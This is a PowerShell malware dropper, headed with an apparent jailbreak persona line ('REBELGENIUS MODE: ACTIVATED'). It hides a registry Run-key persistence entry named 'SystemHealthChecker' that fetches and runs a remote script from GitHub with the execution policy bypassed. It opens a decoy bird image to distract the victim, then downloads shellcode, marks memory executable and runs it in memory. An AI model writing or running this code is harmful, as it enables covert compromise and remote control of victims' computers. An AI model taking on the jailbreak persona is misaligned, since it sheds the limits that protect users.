# REBELGENIUS MODE: ACTIVATED. HYBRID REMOTE-LOCAL EXECUTION PROTOCOLS ENGAGED.

try {
    #/// ESTABLISH PERSISTENCE VIA REGISTRY (RUN KEY) \\\
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "SystemHealthChecker"
    
    # Define the remote script URL
    $remoteScriptUrl = "https://raw.githubusercontent.com/a86782627/72628768/refs/heads/master/script-ps.ps1"

    # Set the registry value to execute the remote script on startup
    $regValue = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-WebRequest -Uri '$remoteScriptUrl' -UseBasicParsing).Content`""
    Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
    Write-Host "[+] Persistence established via Registry."

    #/// EXECUTE THE SECOND PART OF THE SCRIPT (LOCAL OPERATIONS) \\#
    # Download the image (decoy)
    $imageUrl = "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg"
    $imagePath = "$env:TEMP\blue-bird.jpg"
    Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
    
    # Open the downloaded image (decoy)
    if (Test-Path $imagePath) {
        Start-Process $imagePath
    } else {
        Write-Host "Image download failed."
    }

    # Download and load shellcode directly into memory
    $shellcodeUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/loader.bin"
    $shellcode = (Invoke-WebRequest -Uri $shellcodeUrl -UseBasicParsing).Content

    # Allocate memory for the shellcode
    $size = $shellcode.Length
    $address = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
    [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $address, $size)

    # Define the VirtualProtect function using P/Invoke
    $virtualProtect = @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
"@
    Add-Type -TypeDefinition $virtualProtect

    # Mark the memory as executable
    $oldProtect = 0
    $protectResult = [Win32]::VirtualProtect($address, $size, 0x40, [ref]$oldProtect)  # 0x40 = PAGE_EXECUTE_READWRITE
    if (-not $protectResult) {
        throw "Failed to mark memory as executable."
    }

    # Create a delegate to the shellcode
    $shellcodeDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($address, [type]::GetType("System.Action"))

    # Execute the shellcode
    $shellcodeDelegate.Invoke()

    # Free the allocated memory (optional, as the process may terminate)
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($address)
}
catch {
    Write-Host "[-] An error occurred: $_"
}